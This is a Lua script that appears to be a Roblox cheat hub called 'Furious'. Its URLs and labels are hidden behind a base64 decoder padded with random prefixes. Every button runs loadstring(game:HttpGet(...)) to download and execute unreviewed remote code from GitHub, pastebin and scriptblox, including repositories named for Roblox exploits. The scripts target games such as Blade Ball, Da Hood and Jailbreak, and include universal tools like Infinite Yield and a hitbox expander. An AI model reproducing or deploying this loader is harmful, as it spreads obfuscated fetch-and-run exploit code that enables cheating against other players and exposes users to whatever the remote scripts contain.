local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
function IklHQdtwlMyKDOpzmIVzoachkmPSVVkMTJVLYYZZOtICjRcz(data) m=string.sub(data, 0, 55) data=data:gsub(m,'')

data = string.gsub(data, '[^'..b..'=]', '') return (data:gsub('.', function(x) if (x == '=') then return '' end local r,f='',(b:find(x)-1) for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end return r; end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x) if (#x ~= 8) then return '' end local c=0 for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end return string.char(c) end)) end


 


local Furious = loadstring(game:HttpGet(IklHQdtwlMyKDOpzmIVzoachkmPSVVkMTJVLYYZZOtICjRcz('bIVAmqEOkhuwNujACvHOioeLWHAtSTUWSioJkDswnTDhwKzDXVXEAsxaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3ZzcXp6L01lcmN1cnktVWktTGliL21haW4vU291cmNlLmx1YQ==')))()

local GUI = Furious:Create{
    Name = IklHQdtwlMyKDOpzmIVzoachkmPSVVkMTJVLYYZZOtICjRcz('dufkAVFpoIsYlnvIvgvtBnHlFcKUsWHJwBKInnaYtTSkcYFWOSQDEjCRnVyaW91cw=='),
    Size = UDim2.fromOffset(600, 400),
    Theme = Furious.Themes.Dark,
    Link = IklHQdtwlMyKDOpzmIVzoachkmPSVVkMTJVLYYZZOtICjRcz('YYYHZjjwQxtSNBLKaXkVYQEfCvmoWLVKWGfwPmTveBiqMuuMNgKaKDcaHR0cHM6Ly9kaXNjb3JkLmdnL2V1dWhQYWJDS0o=')
}

local Tab = GUI:Tab{
	Name = IklHQdtwlMyKDOpzmIVzoachkmPSVVkMTJVLYYZZOtICjRcz('ghcTdCaMnYKOLxClhyfbvKsuFMSUKhVKQVfBIBIDvfxUjOaLuGVTWVQTWFpbg=='),
	Icon = IklHQdtwlMyKDOpzmIVzoachkmPSVVkMTJVLYYZZOtICjRcz('SpWDGucAcRKQYeThvhhBRgOeHXdKxwDoIfFbtvzsowGoWDfexlmHDaOcmJ4YXNzZXRpZDovLzI3OTAxNzI4ODI=')
}

Tab:Button{
	Name = IklHQdtwlMyKDOpzmIVzoachkmPSVVkMTJVLYYZZOtICjRcz('tzacWqNKnqzsrAcxhRYXCSdddzqwtgQMueFMkGTBNVPGYWgBWJcqMgkQmxhZGUgQmFsbA=='),
	Description = nil,
	Callback = function()
		loadstring(game:HttpGet(IklHQdtwlMyKDOpzmIVzoachkmPSVVkMTJVLYYZZOtICjRcz('KdrpmJWDLYZKfmxBHLWOtRuYwOyWvXTXyJADhkCRVgjKurbnEVcRilfaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL1NveUFkcmlZVC9QaXRidWxsSHViLS0vbWFpbi9EZXN0cm95ZXI='), true))()
	end
}

Tab:Button{
	Name = IklHQdtwlMyKDOpzmIVzoachkmPSVVkMTJVLYYZZOtICjRcz('NKSswdWWboiMlUcThelKoPPRBsAGhqSdxjQEaaolJALlYnnaeRdHyYPQmxhZGUgQmFsbCBWMg=='),
	Description = nil,
	Callback = function()
		loadstring(game:HttpGet(IklHQdtwlMyKDOpzmIVzoachkmPSVVkMTJVLYYZZOtICjRcz('UjibBYjkEHHILHkYKexJDTJHRAdpMjVRShYmBZuOPfdChZwOdjnDgQvaHR0cHM6Ly9jb2RlNHphYS54eXovc2NyaXB0L3NjcmlwdC1sb2FkZXIubHVh')))()
	end
}

Tab:Button{
	Name = IklHQdtwlMyKDOpzmIVzoachkmPSVVkMTJVLYYZZOtICjRcz('hyxSiGrLWLcKMAOAfNLVFamzMuoKEGPyLLFpdrGUZKkvWTrPtsavlHYUkU6IFhMIChSRUxFQVNFKQ=='),
	Description = nil,
	Callback = function()
		loadstring(game:HttpGet(IklHQdtwlMyKDOpzmIVzoachkmPSVVkMTJVLYYZZOtICjRcz('fWZwlyWhUrQNPqaErfUPSdgOTGYJnNiVqoCsvZbjoLVTeYMelLrCuxEaHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L1FaVEtHMDFM'), true))()
	end
}

Tab:Button{
	Name = IklHQdtwlMyKDOpzmIVzoachkmPSVVkMTJVLYYZZOtICjRcz('XBFRnwauPIlJwPofcMRPfpgqNJjfLfZXEILJPXKpyAGbKCXKXaeMGfNTXVyZGVyIE15c3RlcnkgMg=='),
	Description = nil,
	Callback = function()
		loadstring(game:HttpGet(IklHQdtwlMyKDOpzmIVzoachkmPSVVkMTJVLYYZZOtICjRcz('thcyxMNCvKdIEfmkWzOmDJsyMRkjypXxrDcLJSmalsThxQVdQTUCJRBaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL1NpbXBseVNlbnRpbmVsL3IzdGgvbWFpbi9sb2FkZXIubHVh')))()

	end
}

Tab:Button{
	Name = IklHQdtwlMyKDOpzmIVzoachkmPSVVkMTJVLYYZZOtICjRcz('JjjeDbgLurFoXrXEJImHONyrPMuQETVdMFpyRwTlTaEFeHIZeWDUrAwSmFpbGJyZWFr'),
	Description = nil,
	Callback = function()
		loadstring(game:HttpGet(IklHQdtwlMyKDOpzmIVzoachkmPSVVkMTJVLYYZZOtICjRcz('FriahxCZjfkVqwXKWVyeTTdaTDhkkHKXbaNnlSgapuJafxgtNlDTLIyaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0JsaXR6SXNLaW5nL1VuaXZlcnNhbEZhcm0vbWFpbi9Mb2FkZXIvUmVndWxhcg==')))()
	end
}

Tab:Button{
	Name = IklHQdtwlMyKDOpzmIVzoachkmPSVVkMTJVLYYZZOtICjRcz('QTXAmMCtmkzJYoBzJIrrtPRRrNiINVdwbueTNGUlHZcDfLsRwFruKsMUGhhbnRvbSBGb3JjZXM='),
	Description = nil,
	Callback = function()
		loadstring(game:HttpGet(IklHQdtwlMyKDOpzmIVzoachkmPSVVkMTJVLYYZZOtICjRcz('eYxvAGzmmnzkViLexJgInqntThNPINtFXBcnOnEMLVSNwATdScLzSKraHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3LzR3VUJqU3hS')))()
	end
}

Tab:Button{
	Name = IklHQdtwlMyKDOpzmIVzoachkmPSVVkMTJVLYYZZOtICjRcz('OnchCuwZcOZUOfvEvimSSmDphnFPIOgYoyuiSqPTkJAcasNKzUPKgngQXJzZW5hbA=='),
	Description = nil,
	Callback = function()
		loadstring(game:HttpGet(IklHQdtwlMyKDOpzmIVzoachkmPSVVkMTJVLYYZZOtICjRcz('IjoaziqMIlApQtGMCjDqbttpUqwLedbLatggYBJnmzfTMFEfvQsyuWeaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0RJWlpZd2l0aGEzL0Fyc2VuTGliL21haW4vQXJzb25NYWluLmx1YQ==')))()
	end
}

Tab:Button{
	Name = IklHQdtwlMyKDOpzmIVzoachkmPSVVkMTJVLYYZZOtICjRcz('UGqsjcpggQaKMWSsUayhbWjUmzZjgiTXEOsTPWXVQlnMgyWISfFjreqRGFob29kIE1vZGRlZA=='),
	Description = nil,
	Callback = function()
		loadstring(game:HttpGetAsync(IklHQdtwlMyKDOpzmIVzoachkmPSVVkMTJVLYYZZOtICjRcz('uOddkfjvGyCLCayUMqGHQwXpqyVNzjITjMmdQCkjTxXygyNNspVopAiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL1JpcHBlZWQvRGFIb29kaW5hcnkvbWFpbi9jaGFyaW90c3dhcmU=')))()
	end
}

Tab:Button{
	Name = IklHQdtwlMyKDOpzmIVzoachkmPSVVkMTJVLYYZZOtICjRcz('lgptsDBqVjLoHCuGhLrJddPRUwFsRLTnNfnSFnilUFbwHgCMaDVyXpVRGFob29k'),
	Description = nil,
	Callback = function()
		loadstring(game:HttpGetAsync(IklHQdtwlMyKDOpzmIVzoachkmPSVVkMTJVLYYZZOtICjRcz('tZDtzXJtCctyqmtPrYliSKCJwtohjvblFqUznADTQSitHXeUZSfwFmDaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL1JpcHBlZWQvRGFIb29kaW5hcnkvbWFpbi9jaGFyaW90c3dhcmU=')))()
	end
}

Tab:Button{
	Name = IklHQdtwlMyKDOpzmIVzoachkmPSVVkMTJVLYYZZOtICjRcz('hPwRwUGlEtBTnVJFEOxbQQtKlYNFbpesXaUEebcKLHzcNyOaNPuvNGdQmxhZGUgQmFsbCBEdW5nZW9u'),
	Description = nil,
	Callback = function()
		loadstring(game:HttpGet(IklHQdtwlMyKDOpzmIVzoachkmPSVVkMTJVLYYZZOtICjRcz('CXJaTyOrLvLsiLBjfYhpTOtCvfJKOPWRlhqfhBgWUsDKEZLTplPknrpaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0ZGSjEvUm9ibG94LUV4cGxvaXRzL21haW4vc2NyaXB0cy9CbGFkZUJhbGxFdmVudC5sdWE=')))()
	end
}

Tab:Button{
	Name = IklHQdtwlMyKDOpzmIVzoachkmPSVVkMTJVLYYZZOtICjRcz('MOuFUBTZgWYFbPaQFANxQPWoDibUvfBgJsVxthoClMsBbLSDzEGhGlKQW5pbWUgQmFsbA=='),
	Description = nil,
	Callback = function()
		loadstring(game:HttpGet(IklHQdtwlMyKDOpzmIVzoachkmPSVVkMTJVLYYZZOtICjRcz('juPymVmNMHBFYHFEvuEZSfOJPkDOzMluitluzoQKyjxUCjJglpwTfmpaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0ZGSjEvUm9ibG94LUV4cGxvaXRzL21haW4vc2NyaXB0cy9Mb2FkZXIubHVh')))()
	end
}

Tab:Button{
	Name = IklHQdtwlMyKDOpzmIVzoachkmPSVVkMTJVLYYZZOtICjRcz('SlGBYtzORmtdnhkCiDWuSxKLHCJPUksTqAuNzvfmsVVnuVpqVOxZTzjU3Ryb25nZXN0IGJhdHRsZWdyb3VuZHM='),
	Description = nil,
	Callback = function()
		loadstring(game:HttpGet(IklHQdtwlMyKDOpzmIVzoachkmPSVVkMTJVLYYZZOtICjRcz('eDbEMrQvgBhRWfAMbFYZMPUYuUcCaOcsGAwFkZSipvWrqUoAtTqymoaaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0ZGSjEvUm9ibG94LUV4cGxvaXRzL21haW4vc2NyaXB0cy9UU0JVdGlscy5sdWE=')))()
	end
}

Tab:Button{
	Name = IklHQdtwlMyKDOpzmIVzoachkmPSVVkMTJVLYYZZOtICjRcz('zjybHkUzTNrKCjrEpctHYpIPmmCivhYoGPYnhxfDDWQXqWvAnsPenmPRG9vcnM='),
	Description = nil,
	Callback = function()
		loadstring(game:HttpGet(IklHQdtwlMyKDOpzmIVzoachkmPSVVkMTJVLYYZZOtICjRcz('PGqnTdRcKQBYdaWAUrMcxGIkuSyvrimJQUhScBTRDHjHxVdDzigDfjLaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0ZGSjEvUm9ibG94LUV4cGxvaXRzL21haW4vc2NyaXB0cy9Mb2FkZXIubHVh')))()
	end
}

Tab:Button{
	Name = IklHQdtwlMyKDOpzmIVzoachkmPSVVkMTJVLYYZZOtICjRcz('CvCyBQahGrkeqjkSXhLjjEAiKnpLMOpSbzqRifTdwOGIPaBSucneCZyMzAwOA=='),
	Description = nil,
	Callback = function()
		loadstring(game:HttpGet(IklHQdtwlMyKDOpzmIVzoachkmPSVVkMTJVLYYZZOtICjRcz('kFnQTHPHEBZjmpArgikxLEBqdIDFsBQgZYXhhTobFPrjajOtnOmkOAcaHR0cHM6Ly9zY3JpcHRibG94LmNvbS9yYXcvMzAwOC0yLjcxLU9QLUdFVC1GT09ELTU1Mzg=')))() 
	end
}

Tab:Button{
	Name = IklHQdtwlMyKDOpzmIVzoachkmPSVVkMTJVLYYZZOtICjRcz('NEKPsXZmSKrmBwnxPxKcHKQeJXxHaJpVnnAVpZlaXsxRsiwRvCOYZgGRXZlcnkgU2Vjb25kIFlvdSBHZXQgMSBXYWxrU3BlZWQ='),
	Description = nil,
	Callback = function()
		loadstring(game:HttpGet(IklHQdtwlMyKDOpzmIVzoachkmPSVVkMTJVLYYZZOtICjRcz('dFZBqzOCeRrGOhSaatIdlKRumEFxpNuVhVvtryMTHVAIyksSFybPfARaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL05vNk5vNk5vN3l0L0x1bWluLUh1Yi9tYWluLyU1QkZSRUUlMjBMSU1JVEVEJTVEJTIwRXZlcnklMjBTZWNvbmQlMjBZb3UlMjBHZXQlMjAlMkIxJTIwV2Fsa1NwZWVk')))()
	end
}

Tab:Button{
	Name = IklHQdtwlMyKDOpzmIVzoachkmPSVVkMTJVLYYZZOtICjRcz('RrGmciNYWHkfQrKlPXhYYtaoivztzTiAlghveefkQQABGUUUjWrEibKQW5pbWUgUHVuY2hpbmcgU2ltdWxhdG9yIDI='),
	Description = nil,
	Callback = function()
		loadstring(game:HttpGet(IklHQdtwlMyKDOpzmIVzoachkmPSVVkMTJVLYYZZOtICjRcz('AqOURBbafIPjXycptnWOpBkILKqaptTgNafpQlFpgJMnsZIcCnblpAeaHR0cHM6Ly9zY3JpcHRibG94LmNvbS9yYXcvVVBELTMtQW5pbWUtUHVuY2hpbmctU2ltdWxhdG9yLTItT1AtU0NSSVBULU5PLUtFWS1XT1JLSU5HLVNPTEFSQS0xNDE4OQ==')))()
	end
}

Tab:Button{
	Name = IklHQdtwlMyKDOpzmIVzoachkmPSVVkMTJVLYYZZOtICjRcz('XfNEtfjnZRqIyodEIBtDxghYBazPfApSUQYBozjGFVhTuuvCtZNpvraQW5pbWUgTWF4IFNpbXVsYXRvcg=='),
	Description = nil,
	Callback = function()
		loadstring(game:HttpGet(IklHQdtwlMyKDOpzmIVzoachkmPSVVkMTJVLYYZZOtICjRcz('MFOmnFvjcaZyvAXnKyNePUzAaktgcGMhTLHAAgIVBYfppsBmWePanTOaHR0cHM6Ly9zY3JpcHRibG94LmNvbS9yYXcvVVBEMTYuNC1BbmltZS1NYXgtU2ltdWxhdG9yLVNjcmlwdC0xMzUxNw==')))()
	end
}

local Tab1 = GUI:Tab{
	Name = IklHQdtwlMyKDOpzmIVzoachkmPSVVkMTJVLYYZZOtICjRcz('njgKDcRukITtxnHyNsHJknMPwFEplIxwLMkKxCgFQVYZsszyHHhcQVXSHVicw=='),
	Icon = IklHQdtwlMyKDOpzmIVzoachkmPSVVkMTJVLYYZZOtICjRcz('ggSQsxPTjAZAKTrkUkTvXFcmYkhEbukJKhsmBHyvttgLjfAohYpBKZgcmJ4YXNzZXRpZDovLzI3Nzc3MjU2NjA=')
}

Tab1:Button{
	Name = IklHQdtwlMyKDOpzmIVzoachkmPSVVkMTJVLYYZZOtICjRcz('vYZtblkLaGFbzQfXLoYUhYMirGzsAxIFSVpPLSyUGlozzyVKSogEokYT21lbiBIdWI='),
	Description = nil,
	Callback = function()
		loadstring(game:HttpGet(IklHQdtwlMyKDOpzmIVzoachkmPSVVkMTJVLYYZZOtICjRcz('tRzsxGtbrRuzYzmGnVeriCVgAaiYIrAXBKwXWxcafgDjVDXOQTGdEoyaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL21lenpvcGVyYS9PbWVuLUh1Yi9tYWluL29tZW5faHViLmx1YQ==')))()
	end
}

Tab1:Button{
	Name = IklHQdtwlMyKDOpzmIVzoachkmPSVVkMTJVLYYZZOtICjRcz('aCgktelhLpnuVydsEXChpWXQkupeyHFpmJkVHEIfKQpzBCiyyNmyvsGU2NyaXB0TWl4IEh1Yg=='),
	Description = nil,
	Callback = function()
		loadstring(game:HttpGet(IklHQdtwlMyKDOpzmIVzoachkmPSVVkMTJVLYYZZOtICjRcz('kHWzyEqjIYqfXIOGgzWoyCPJIvZLCqNCwTPWmlsJZvHwQKEXdHWPafkaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0I0VDBOQ0gxSy9TY3JpcHRNaXgtSHViL21haW4vU2NyaXB0TWl4LUh1Yg==')))()
	end
}

Tab1:Button{
	Name = IklHQdtwlMyKDOpzmIVzoachkmPSVVkMTJVLYYZZOtICjRcz('bELfeMqRuxBPxfTwfyMoxsAIozcycgwdNfzpMqesHPUEyDeDDGNjRZhTGlnaHR1eCBIdWI='),
	Description = nil,
	Callback = function()
		loadstring(game:HttpGet(IklHQdtwlMyKDOpzmIVzoachkmPSVVkMTJVLYYZZOtICjRcz('UyVOvzlxvDbWgbJGaJNgGcvOrcvRyWbBbqFtKLYeiDeHafWDmOyivkzaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2Nvb2w4M2JpcmRjYXJmbHkwMnNpeC9MaWdodHV4U29sYXJhU3VwL21haW4vUkVBRE1FLm1k')))()
	end
}

Tab1:Button{
	Name = IklHQdtwlMyKDOpzmIVzoachkmPSVVkMTJVLYYZZOtICjRcz('CBRFXtLBRIbdnwzcXRCCpJoyxpRGYnwTPnkYAuHJHpwrczoJxcbjiHMUmlubnMgSHVi'),
	Description = nil,
	Callback = function()
		loadstring(game:HttpGet(IklHQdtwlMyKDOpzmIVzoachkmPSVVkMTJVLYYZZOtICjRcz('KGnoLnXdGuDaNERzYZENVzwadeFtDGIpSRHrCPOwMMCaokiEdYmartkaHR0cHM6Ly9zY3JpcHRibG94LmNvbS9yYXcvSG9ycm9ycy1STkctUEhPQklBLTEtUklOTlMtSFVCLVN1cHBvcnQtU29sYXJhLTE0MzI5')))()
	end
}

local Tab2 = GUI:Tab{
	Name = IklHQdtwlMyKDOpzmIVzoachkmPSVVkMTJVLYYZZOtICjRcz('GgvrBmZKbwtOLaKjtQEsuOYhHYYYmHePPDcbVQeKotzwtedKkgvOPZtVW5pdmVyc2Fscw=='),
	Icon = IklHQdtwlMyKDOpzmIVzoachkmPSVVkMTJVLYYZZOtICjRcz('pXJhWHPnRfBvCMcwhbPoBwyLIRbkiAPcuSlMOIgHtSZAzWDyknHujMLcmJ4YXNzZXRpZDovLzI3OTAxNzM2MTA=')
}

Tab2:Button{
	Name = IklHQdtwlMyKDOpzmIVzoachkmPSVVkMTJVLYYZZOtICjRcz('NDSIfCLHNJoAPNtJiJaqXjYBOmePoxKnKWAiOGrFVIMeALsrrhPewCGSW5maW5pdGUgWWllbGQ='),
	Description = nil,
	Callback = function()
		loadstring(game:HttpGet(IklHQdtwlMyKDOpzmIVzoachkmPSVVkMTJVLYYZZOtICjRcz('NoGEDzKlkfFKpycsjdlzoKEfEdIwsSMaAPxgIloTWZxNEEIQGyePWEiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0VkZ2VJWS9pbmZpbml0ZXlpZWxkL21hc3Rlci9zb3VyY2U=')))()
	end
}

Tab2:Button{
	Name = IklHQdtwlMyKDOpzmIVzoachkmPSVVkMTJVLYYZZOtICjRcz('oYZNDaOotrNXBobiUaJHUHitKSzkupqPIzZbauvOEFFSruaQnCJpzmvSGl0Ym94IEV4cGFuZGVy'),
	Description = nil,
	Callback = function()
		loadstring(game:HttpGet(IklHQdtwlMyKDOpzmIVzoachkmPSVVkMTJVLYYZZOtICjRcz('wRWokbJlORKUfKRZByJIjRtzBQyUCLEIHloaKxxEEVuEBeuKPyBWAWdaHR0cHM6Ly9zY3JpcHRibG94LmNvbS9yYXcvVW5pdmVyc2FsLVNjcmlwdC1VcGRhdGUtc2NyaXB0LWhpdGJveC05MzI2')))()
	end
}

Tab2:Button{
	Name = IklHQdtwlMyKDOpzmIVzoachkmPSVVkMTJVLYYZZOtICjRcz('PdhcZZomaZHopoNhqmxCGWckMgCcTskUUicMOFHNECkEqALTqDsVLrHU25pcGVy'),
	Description = nil,
	Callback = function()
		loadstring(game:HttpGet(IklHQdtwlMyKDOpzmIVzoachkmPSVVkMTJVLYYZZOtICjRcz('CkpXYJEOxIsdVvxxoQWkPakOsvLFZPvSlBwzGDzWKGctocHFlhKDNwyaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0ZGSjEvUm9ibG94LUV4cGxvaXRzL21haW4vc2NyaXB0cy9TbmlwZXIubHVh')))()
	end
}

GUI:Notification{
	Title = IklHQdtwlMyKDOpzmIVzoachkmPSVVkMTJVLYYZZOtICjRcz('ogXNaBLBXuYWVOrBekSyPAmTHYSZXMdChzulVwbXkCKzcoCSRrdyMGBWW8h'),
	Text = IklHQdtwlMyKDOpzmIVzoachkmPSVVkMTJVLYYZZOtICjRcz('EGNbtnWpoRxmfKqhzxoicItlGuvzKEEXffENtUpXSgiTEWJwafCzpDbWW91IHNoYWxsIGpvaW4gdGhlIGRpc2NvcmQgc2VydmVyIQ=='),
	Duration = 4,
	Callback = function() end
}

GUI:Notification{
	Title = IklHQdtwlMyKDOpzmIVzoachkmPSVVkMTJVLYYZZOtICjRcz('vLOYucvcahMmumQyuIPZjRwGlPwTAddPzQlIDhRHqcdnkrKmuylGHfxVyBtYW5z'),
	Text = IklHQdtwlMyKDOpzmIVzoachkmPSVVkMTJVLYYZZOtICjRcz('yVVEYOhukEXrIgloktEGIBygPhuwgSwSeIknYpCEpKkvAreDKCjBAkdVGhhbmsgeW91IGZvciBidXlpbmcgcHJlbWl1bSE='),
	Duration = 7,
	Callback = function() end
}    
